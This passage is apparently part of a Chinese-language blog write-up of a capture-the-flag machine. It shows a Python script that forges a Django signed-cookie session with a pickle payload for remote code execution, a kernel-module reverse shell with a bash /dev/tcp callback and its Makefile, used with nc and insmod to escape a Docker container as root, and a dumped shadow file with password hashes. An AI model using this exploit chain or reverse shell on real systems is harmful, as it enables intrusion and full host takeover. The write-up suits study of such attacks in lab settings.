<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">&#x27;55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&amp;87b&#x27;</span>)  <span class="comment"># SECRET_KEY 参数的值为 demo Django 项目的 SECRET_KEY 值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CreateTmpFile</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo xxxxx | base64 -d | bash&#x27;</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=CreateTmpFile(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br></pre></td></tr></table></figure>

<p>生成的session替换到web上就可以rce啦</p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>到这里其实就简单了</p>
<p>弹shell进入容器，本来是打算跑个<code>deepce</code>或者<code>linpea</code>s的，不过因为<code>capsh --print</code>输出里有<code>cap_sys_module</code>,所以速通了。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module</a></p>
</blockquote>
<p>按照hacktricks讲的分别创建一个</p>
<h2 id="reverse-shell-c"><a href="#reverse-shell-c" class="headerlink" title="reverse-shell.c"></a>reverse-shell.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kmod.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;AttackDefense&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;LKM reverse shell module&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxxxxx/4444 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* envp[] = &#123;<span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// call_usermodehelper function is used to create user mode processes from kernel space</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">reverse_shell_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">reverse_shell_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Exiting\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(reverse_shell_init);</span><br><span class="line">module_exit(reverse_shell_exit);</span><br></pre></td></tr></table></figure>
<p>以及一个</p>
<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m +=reverse-shell.o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">  make -C /lib/modules/$(shell <span class="built_in">uname</span> -r)/build M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">  make -C /lib/modules/$(shell <span class="built_in">uname</span> -r)/build M=$(PWD) clean</span><br></pre></td></tr></table></figure>

<hr>
<p><code>nc -lvnp 4444</code></p>
<p><code>insmod reverse-shell.ko</code></p>
<p>就拿到了root 的 shell</p>
<h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T<span class="variable">$Gctu2C9XwCFVr1qINWJjA</span>/<span class="variable">$u8IdKz0x2uCYAzOIx0qxNvBQEjY0uOaRwgA1sRC8Aj8</span>:19592:0:99999:7:::</span><br><span class="line">daemon:*:19592:0:99999:7:::</span><br><span class="line">bin:*:19592:0:99999:7:::</span><br><span class="line">sys:*:19592:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19592:0:99999:7:::</span><br><span class="line">games:*:19592:0:99999:7:::</span><br><span class="line">man:*:19592:0:99999:7:::</span><br><span class="line">lp:*:19592:0:99999:7:::</span><br><span class="line">mail:*:19592:0:99999:7:::</span><br><span class="line">news:*:19592:0:99999:7:::</span><br><span class="line">uucp:*:19592:0:99999:7:::</span><br><span class="line">proxy:*:19592:0:99999:7:::</span><br><span class="line">www-data:*:19592:0:99999:7:::</span><br><span class="line">backup:*:19592:0:99999:7:::</span><br><span class="line">list:*:19592:0:99999:7:::</span><br><span class="line">irc:*:19592:0:99999:7:::</span><br><span class="line">_apt:*:19592:0:99999:7:::</span><br><span class="line">nobody:*:19592:0:99999:7:::</span><br><span class="line">systemd-network:!*:19592::::::</span><br><span class="line">messagebus:!:19592::::::</span><br><span class="line">avahi-autoipd:!:19592::::::</span><br><span class="line">sshd:!:19592::::::</span><br><span class="line">alex:$y$j9T$vRmhfv9eghNK4I7HfdkjW0<span class="variable">$5fFIjvFlbw5ki</span>/5cvoSkG/YizBXms47kw9tubbF/l42:19759:0:99999:7:::</span><br><span class="line">morty:$y$j9T<span class="variable">$0lTi82bFeyrX9oyH</span>/XMnE.<span class="variable">$V8E6g5oxm5</span>/LGomE.6NBAIwvieFOLqSgm3b7LnZlPT5:19781:0:99999:7:::</span><br><span class="line">postfix:!:19629::::::</span><br><span class="line">_laurel:!:19839::::::</span><br></pre></td></tr></table></figure>
        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/06/06/box-freelancer-wp/"
      title="【season-5】box freelancer wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【season-5】box freelancer wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/05/26/box-BoardLight-wp/"
      title="【season-5】box BoardLight wp"
     >

    <p class="title-text">
      
        【season-5】box BoardLight wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2024 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
